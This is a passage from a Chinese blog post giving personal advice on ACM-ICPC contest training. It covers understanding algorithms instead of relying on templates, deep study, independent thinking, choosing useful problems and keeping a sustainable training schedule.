title="算法学习是ACM比赛所要推广或者要提倡的一个方面"></a>算法学习是ACM比赛所要推广或者要提倡的一个方面</h2><p>记得曾经路过某人的blog，上面说他作比赛的时候遇到了一个dijkstra，他没做出来，然后评论到（大意）：我才不会花时间去搞明白“这种”算法。 “这种”也许有可能是指：没什么实用性，对吧，这样我就不想评论了（又是有关科学和工程的讨论）。但起码有一点需要明确的：ACM-ICPC比赛时关于计算机科学的比赛，计算机科学是算法的科学，计算机算法中dijkstra有着重要的实际和启发意义，所以比赛一定要考。</p><p>你参加这个比赛，要拿奖，就必须学习这种算法。你也许觉得你智商很高，但ACM-ICPC比赛本身不是智力比赛，比赛就是要让你去学习这些东西，所以，如果你不想学的话，我觉得也没有必要参加。说道这，可能偏题有点远，但是希望以上的分析能得出这样一个基础结论：不想学好算法，那没有必要来比赛。</p><h2 id="用模板是不好的"><a href="#用模板是不好的" class="headerlink" title="用模板是不好的"></a>用模板是不好的</h2><p>现在很多我们弱校的ACM-ICPC选手比较依赖模板，说实话，我也很依赖，但是我起码知道一点，这样是不对的，某种意义上说，这是你没有把算法学明白的一种表现。而且也严重影响编码速度。在我见过的huicpc035参加过的比赛中，他从来没有看过模板，全部现场敲，有一次比赛有个图强连通分量+缩点+染色+什么的题去了，我在他们机房做，我则抄模板，结果总共敲了1个半小时，而035明确算法之后，啪啦啪啦，估计30多分钟就敲完了。这里顺便八卦一下他：我和kevin以前去湖大集训队玩的时候，给他取了个外号——打字猛男（他应该还不知道）。因为他敲键盘的声音特别大特别快，呵呵。</p><p>我觉得他敲代码的时间没有浪费，某牛曾说：因为每次敲都有可能有不同的错误，所以不用模板是好习惯。我最开始学dancing link的的时候，自己敲出了代码，然后接下来的几道题部分参考了以前的代码，后来基本上是直接copy。现在，当别人问我dancing link算法或有关的题目的时候，我已经是一脸茫然。</p><p>所以，用模板是不好的，有时候由于某些原因可能你用了模板，但你起码要知道这要做是不对的，并且有机会要改正。</p><h2 id="需要深入学习"><a href="#需要深入学习" class="headerlink" title="需要深入学习"></a>需要深入学习</h2><p>像 ACRush、zzy、ahyangyi…等等国家队的天才们，本身难以说我们与他们之间有什么可比性。但是他们的学习方法应该还是值得借鉴的，他们的学习方法当然我们得不到言传身教，但是从他们在国家队集训的论文中和他们搞完ACM-ICPC以后的轨迹中，可以有所体现。那就是：深入学习。</p><p>其实这点我来讲可能还是不够有力，因为我这方面也很欠缺，我尽量说下我的想法。</p><p>首先，觉得ACMer学算法不应停留在看看代码实现这个层面，在算法思想上要有清醒的认识，在正确性分析上要也应该要有较好的逻辑。因为网上的代码的实现上的一些细枝末节很可能掩盖了算法本身有的简洁性、美感和思想。因而丧失了对算法整体上的一些认识。还拿dijkstra算法打比方，有些算法不是基于 dijskstra的直接建模，而是需要你修改这个算法，这时你对算法没有真正理解的话，也就一筹莫展了。</p><p>我为什么老说Dijkstra算法，因为确实很多人都只知道用模板，而且模板还不好，在我看到的Dijkstra实现中，只有czyuan_acm的代码写得好。不是说其他的不对，但确实是有问题，投机取巧了的。</p><p>所以，要阅读论文和书籍，尤其与英文书籍，窥到它的本质。另一方面，只有这样，你学的的东西才能在ACM-ICPC以外，给你一定的启发——否则你会迅速忘掉它的。</p><p>据我所知，035起码阅读了几十篇集训队论文，orzorzorz，而且切掉了例题。</p><h2 id="独立思考"><a href="#独立思考" class="headerlink" title="独立思考"></a>独立思考</h2><p>这点我也很惭愧，因为我也是缺乏独立思考的。很多题我不会了就去搜解题报告，所以反而我的搜资料能力变得特别强。035和许多大牛在这点上做的比我好多了，他们遇到题不会的时候，也不会很急于把题目做出来，可能每隔一段时间又拿出来想一次，总有一天想通了，之后这一类型的题目基本上也就没有什么问题了。</p><p>而我恰恰比较“虚荣”，做到的题目不会不太愿意想太久，就想尽量快些AC，于是急于看解题报告，这样导致的一个问题就是有些重要的东西解题报告中没有提到，而我也没去想就把他们忽略了，这样，我还是不会做。我和035讨论问题的时候，我不会一般就直接找他要代码，但是他不懂的时候，顶多问我大体的思路，而绝对不会要代码的。</p><p>在去年ACM赛区尾声的时候，我发现035做中难题的能力已经明显超过我一个档次。看他现在做的题目，已然是相当变态，几乎是都100以下人ac，这些题目我看了基本上没什么想法，更要命的时，解题报告也搜不到。035目前的状态让我想起一个人，不知道大家知道不：wangfangbob，他切bt题的能力也是令人汗颜的。</p><h2 id="做有意义的题"><a href="#做有意义的题" class="headerlink" title="做有意义的题"></a>做有意义的题</h2><ul><li>不要做水题，这里的水题定义为：一眼就能看出做法，而且中途的实现可以预计没有太多问题的题目。</li><li>做能够强化你最近学到的东西的题目</li><li>你不会但你应该会的题目</li></ul><p>这同时也是在说，某些没太多代表性的题目可以少做，因为对比赛帮助不大。（当然我这个参加比赛的目的很功利，非功利主义者另当别论）刚才，我把我在poj上的号和他的号对比了下，他ac而我没ac的基本上是难题，我ac他没ac的一般是水题，看得我想哭，5555。</p><p>补充一点：ac的人多的并不一定代表着水题，有些几千人ac的题目，在现场赛中ac的人很少，这样的题目往往是有一定思维难度且编码不难的好题，这种题目要认真做，某个学长说：经典的题目啊，只有那么多，做一道，就少一道。</p><h2 id="估算好某种训练所需要的时间"><a href="#估算好某种训练所需要的时间" class="headerlink" title="估算好某种训练所需要的时间"></a>估算好某种训练所需要的时间</h2><p>我觉得我学网络流就是一个例子，我在大概赛区赛之前2个月开始学习网络流，1个月前开始学习费用流，但是对于我来讲，这两个月培养出来的网络流思维还是不够（虽然也做了不少题），特别是，这种题目往往作为中难的题目出现，不会让你随便水的，于是，北京赛区的那道网络流当时就没有想出来——功利地说，学习网络流没有得到好的效果。</p><p>所以，现在来看，当时其实我可以不搞网络流。如果要学一种比较有难度的东西，并且还必须把他搞好，应该较早地，全面地学习，必须长期的训练以培养这种思维。打个比方，如果你微积分平时不学，仅仅考试前一周狂做题目，我觉得上90分是很困难的。</p><p>当然，这要根据个人情况而定，我的理解能力应该说是中等水平，如果牛的话应该可以更快地学好。</p><h2 id="有关训练的度"><a href="#有关训练的度" class="headerlink" title="有关训练的度"></a>有关训练的度</h2><p>我有时候通宵刷体，这里我不知道huicpc035有没有这个习惯，不过我通宵的时候没见到他通宵。<br>我觉得其实通宵刷体，或者太长时间地做题，还是不好的。我们为什么会这样有热情的做题呢，因为我们有兴趣；但是一个人的成功不仅仅依赖于兴趣，还要依赖于自控。这和打游戏是一个道理，游戏太有趣以至于我们常常通宵——ICPC题目也太有趣，所以有时候通宵。而且很多时候是，由于一道题AC不掉，所以赌气一定要搞定才睡觉，这样一不小心，就通宵了。</p><p>其实我明白，通宵不一定效果好，这仅仅说明了你兴趣很高涨而已。通宵往往会打乱你的时间安排，打乱你的生物钟，进而影响你短期或是中期的训练计划。而且，疲惫的状态下做题，你往往只有ac题目的欲望，而完全丧失了ac题目的灵气。所以，我建议，ACMer一定要合理安排作息，能够自控，这样不仅仅对你做 ACM-ICPC有好处。</p><p>总之，有效训练是很重要，只有通过有效的训练你才能获得你参加这个比赛应得的东西。</p><p>还有就是，除了035以外，另一个值得大家学习的就是richardxx——我也很佩服，我并不觉得他是天才，我觉得他以全方位的努力让他自己变得优秀，大家看他的blog可以看到他的学习历程。</p><p>最后要说下刻苦训练这一点，这个我主要想说给我们学校的acm队员：</p><p>客观的说，我们学校很多名校落榜生（我相比而言是水进的）。确实都蛮聪明的，但再聪明也比不上ACRush吧？人家可是SGU都切满了！ACM不是智力测试，不是你什么都不做就可以天上掉馅饼的。当然我不是说题目一定要做多少多少道，但如果你觉得你可以一心二用，从概率上来讲，你百分之九十地错了，我是个工科生，我相信概率而非奇迹。</p><p>我觉得035这方面也是值得我们学习的，我比较喜欢扯淡，有时候聊题目的时候也经常不小心就去扯其他话题去了，在学习的时候，035是坚决不多聊乱七八糟的东西的，除了讨论上QQ，平时据我观察都是残酷地训练。现在回想起来，我有点后悔，QQ上和网上花掉的时间用来学习新的东西，也许结果会更好。</p><p>ACM-ICPC绝不是大学生活的全部，也不是搞算法的全部，你大可以花时间去做其他研究，做项目，或者参加学生工作(我更欣赏那些对人生和职业有良好规划的ACMer)；但是，如果你搞ICPC的那段时间你不是全部投入，那的在ACM-ICPC生涯中，将只有后悔。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 算法 </tag>
            
            <tag> 训练 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
